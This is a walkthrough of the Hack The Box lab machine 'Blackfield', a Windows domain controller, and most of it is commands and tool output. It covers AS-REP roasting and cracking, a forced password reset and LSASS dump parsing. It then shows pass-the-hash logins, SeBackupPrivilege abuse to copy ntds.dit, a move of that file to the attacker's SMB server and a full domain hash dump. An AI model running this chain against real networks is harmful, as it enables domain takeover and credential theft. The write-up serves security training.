<img width="1093" height="158" alt="image" src="https://github.com/user-attachments/assets/ab62c5a9-e6ee-4fb7-a011-a0053caf4c7f" />


Blackfield is a hard rated windows box which starts with guest access enabled to the smb share and with a share named profiles$ where some local users are there, getting all the users and performing a asrep roast attack we get a hit on a account which have outbound controls over another account which leads to the smb share where a lsass dump can be retrived. Using the file we can dump the creds and get a shell over winrm.

Further we have seBackupPriv over the user and using it we can get the ntds.dit file which is present only on domain controllers and have hashes of all the users of the domain.

 

# Enumeration

## Nmap

```bash
nmap -p- --min-rate=2000 -v -sVC -oN nmap 10.10.10.192

Nmap scan report for 10.10.10.192
Host is up (0.46s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-20 21:50:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-20T21:51:28
|_  start_date: N/A
|_clock-skew: 6h33m57s
```

Seeing the ports we have default ports open on the machine which can say this is a domain controller.

## SMB

We can enumerate more on the port 445.

There is more stuff we can do here like, checking for null sessions, guest sessions, getting users, getting shares, rib brute and many more

### Checking for guest account and shares with read privs

```bash
nxc smb  10.10.10.192 -u 'guest' -p ''  --shares 
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share 
```

## Getting the users list

```bash
smbclient //10.10.10.192/profiles$            

Password for [WORKGROUP\root]:

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
	...

                5102079 blocks of size 4096. 1695873 blocks available
smb: \> mget *
```

we can get a list of users this way and then list the directory locally and the direct the output to users

We could also do a rib brute since we have guest account and get a users of list that way too. The list we get from rid brute is a little bit diffrent as it has all the current domain users and these are just normal/local accouts which we got through profiles$

But anyway both of them would work in this case.

# Exploitation

Now that we have a list of users we can try asrep roast attack to get the hash of user and thenc rack it locally

```bash
nxc ldap 10.10.10.192 -u users -p '' --asreproast ASREProastables.txt --kdcHost 10.10.10.192
LDAP        10.10.10.192    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

We can asrep roast using netexec and then eventually we will get a hit for the user support

```bash
cat ASREProastables.txt 
$krb5asrep$23$support@BLACKFIELD.LOCAL:7879161bee01eda5ed5f81d2764d408e$4a9d5b8b163cd210b97fb4564a4e94ee95ab15264f57f1358e3ead0ddae22bec2aaffd103b3b39bed439999109bf7d176ea8b8ce230f93312090b2ba1503ae8c5ab90103a02793019f769d3e3aab1be3e0c8f3d8124f6a393ea1a83cc4028670561202f47d15cf531e5010ab3a8d76faec15a0b278544b19355243de661dd4d80a2c45e5b3414e72bb2d559087f35af9a758f062218fe280c31a6b46b96413c2056ea4d649dbf1e54b9d805c0ff658d7abcb8ecf8cd7b7c9a6cb9477736d9238fec3992956d14725a70dbb4fa958cb8a80460fe9e0044e587e65600975b94398a29cc620c87f8cfb3b6e53334ede202777d63d76
```

Now lets crack this hash

```bash
hashcat ASREProastables.txt /usr/share/wordlists/rockyou.txt --show 
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5asrep$23$support@BLACKFIELD.LOCAL:7879161bee01eda5ed5f81d2764d408e$4a9d5b8b163cd210b97fb4564a4e94ee95ab15264f57f1358e3ead0ddae22bec2aaffd103b3b39bed439999109bf7d176ea8b8ce230f93312090b2ba1503ae8c5ab90103a02793019f769d3e3aab1be3e0c8f3d8124f6a393ea1a83cc4028670561202f47d15cf531e5010ab3a8d76faec15a0b278544b19355243de661dd4d80a2c45e5b3414e72bb2d559087f35af9a758f062218fe280c31a6b46b96413c2056ea4d649dbf1e54b9d805c0ff658d7abcb8ecf8cd7b7c9a6cb9477736d9238fec3992956d14725a70dbb4fa958cb8a80460fe9e0044e587e65600975b94398a29cc620c87f8cfb3b6e53334ede202777d63d76:#00^BlackKnight
```

Now do we have some creds we can enumerate more and get more info about the domain

## More Enumeration

Since we have a set of creds and we can authenticate over ldap we can get the information and pass it to bloodhound.

```bash
nxc ldap 10.10.10.192 -u support -p '#00^BlackKnight' --bloodhound -c all --dns-server 10.10.10.192
LDAP        10.10.10.192    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.10.10.192    389    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
LDAP        10.10.10.192    389    DC01             Resolved collection methods: session, container, localadmin, dcom, acl, rdp, objectprops, trusts, psremote, group
LDAP        10.10.10.192    389    DC01             Done in 00M 36S
LDAP        10.10.10.192    389    DC01             Compressing output into /root/.nxc/logs/DC01_10.10.10.192_2025-09-21_070207_bloodhound.zip
```

After downloading the bloodhound data and uploading it to bloodhound, we have a outbound control over the user audit2020 of entity force password change

<img width="1589" height="432" alt="image" src="https://github.com/user-attachments/assets/544001c9-15ba-484b-b3fe-bc8a4288a58b" />


We can use this and change the passoword for the user audit2020.

```bash
net rpc password "AUDIT2020" "newP@ssword2022" -U "BLACKFIELD.local"/"support"%'#00^BlackKnight' -S "DC01.BLACKFIELD.local"
```

## Shell as svc_backup

Now we have the creds for the user audit2020 let’s connect to the forenci share and get some files which could be helpful 

```bash
smbclient //10.10.10.192/forensic -U audit2020
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1690615 blocks available
smb: \> cd memory_analysis
smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020
```

We see we have a bunch of zip files in the folder memory_analysis, we could go for the commands_output folder and get the files but there is nothing usefull over there except the file domain_users.txt we can see svc_backup as one of the user.

We could download everhting of the share using the following

```bash
smb: \> prompt off
smb: \> recurse on 
smb: \> mget *
```

Since the zip files are pretty big and i got error for downloading the files over smb.

Let’s mount the smb share to our /mnt/share on out local machine and then we can copy the zip files

## Mounting smb share to local file system

```bash
mkdir /mnt/share 
                                                                                                                             
mount -t cifs //10.10.10.192/forensic /mnt/share -o username=audit2020     
--#Password for audit2020@//10.10.10.192/forensic: 
                                                                                                                             
cd /mnt/share/memory_analysis 
                                                                                                                             
ls
conhost.zip  dfsrs.zip    ismserv.zip  mmc.zip            ServerManager.zip  smartscreen.zip  taskhostw.zip  wlms.zip
ctfmon.zip   dllhost.zip  lsass.zip    RuntimeBroker.zip  sihost.zip         svchost.zip      winlogon.zip   WmiPrvSE.zip
```

Now that we have successfully connected to the share lets copy the files

Now out of all file the lsass.zip file is the most intresting file as LSASS stands for the [Local Security Authority Subsystem Service](https://www.google.com/search?client=firefox-b-d&sca_esv=88cc58f84633fe9a&sxsrf=AE3TifPs8AqZN8llQIleNRtVMGSpiDUITA%3A1758453115439&q=Local+Security+Authority+Subsystem+Service&sa=X&ved=2ahUKEwjU37Kq3OmPAxW8zTgGHQshNwsQxccNegQIGBAB&mstk=AUtExfBkMuNjsZdLEi-usFqZMjHCjIWcofmA55krSq51nhZBN0St0dtA1qAX38v_pPqTL_ZHYPSSTEcGNolDlEoOZ6e4-kSmaeGsXH1g4GPHBHb3y-XJIN5LzkrXyHFcTUveAVnGC_BE4QDFKngeYdvhS8LAZocngsvdt2tBY4n4ypnTOMBlPDdONOYWzGlXbqf5aOq5DwO6YZSEqtatg_g9ylwd_aXdWQWOWF5uL_mLi3LJy9R_simaPPjoqAI6U4wC4lJhUcFEmFxaytbwq2-InHQX&csui=3) (Lsass.exe), a critical Windows process responsible for user
authentication, security policy enforcement, and the handling of user credentials and access tokens on a system.

We can get the file and dump the creds present

Unzipping the file we get the lsass.DMP file, now we can use pypykatz a python representation of mimikatz

```bash
pypykatz lsa minidump  lsass.DMP
```

This will dump all the creds that were present in the memory at the time of creating it

Looking at the results we can see the nt hash for the user svc_backup and we know this user is a domain user from the domain_users.txt file 

```bash
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
```

## Privilege Escalation

```bash
PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We see our user is in the Backup Operators Group and also have a privileges of SeBackupPrivilege and SeRestorePrivilege

Using these privis we can get the ntds.dti file which have the hashes of all the domain users, Since this file is already being used by another process we cannot just copy this file and download it.

We first have to shadow copy the c dive and then copy the file ntds.dit file and then download it and get the hashes locally

### dsh script for diskshadow

We can make a dsh script to create a shadow copy of the c drive and expose it on a drive we can name it as z:/ drive

```bash
set context persistent nowriters
add volume c: alias bak
create
expose %bak% z:
```

Now we can convert this script in our linux using unix2dos and then upload it 

```bash
unix2dos bak.dsh
```

### Creating a shadow copy

```bash
*Evil-WinRM* PS C:\temp> upload blackfield/bak.dsh
                                        
Info: Uploading /home/kali/htb/blackfield/bak.dsh to C:\temp\bak.dsh
                                        
Data: 112 bytes of 112 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\temp> diskshadow /s bak.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/22/2025 1:19:19 PM

-> SET CONTEXT PERSISTENT NOWRITERS
-> add volume c: alias bak
-> create
Alias bak for shadow ID {b22c05b6-71f1-4d45-b43a-e019b2ebee0a} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {04d3260e-7a8b-45b3-aece-d9bd1be4e5ca} set as environment variable.

Querying all shadow copies with the shadow copy set ID {04d3260e-7a8b-45b3-aece-d9bd1be4e5ca}

        * Shadow copy ID = {b22c05b6-71f1-4d45-b43a-e019b2ebee0a}               %bak%
                - Shadow copy set: {04d3260e-7a8b-45b3-aece-d9bd1be4e5ca}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 9/22/2025 1:19:20 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %bak% z:
-> %bak% = {b22c05b6-71f1-4d45-b43a-e019b2ebee0a}
The shadow copy was successfully exposed as z:\.
->
->
```

We can see w have sucessfully shadow copt the and exposed as z, now lets copy the file using robocopy and then get the hashes from it.

```bash
robocopy /b z:\windows\ntds . ntds.dit
```

```bash
C:\temp> ls

    Directory: C:\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/22/2025   1:19 PM            625 2025-09-22_13-19-20_DC01.cab
-a----        9/22/2025   1:19 PM             86 bak.dsh
-a----        9/21/2025  10:09 AM       18874368 ntds.dit
```

and now we have our ntds.dit file let’s move this file to out machine over, we can start a smb server on our machine using

```bash
impacket-smbserver share . -smb2support
```

We can now move our ntds.dit file to smb server 

```bash
move ntds.dit //10.10.16.21/share
```

### Extracting hashes from NTDS.DIT

```bash
impacket-secretsdump -ntds ntds.dit -system system local       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
.
.
.
```

## Shell as Administrator

```bash
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Using the hash above we can get our shell as administrator and get our root flag.
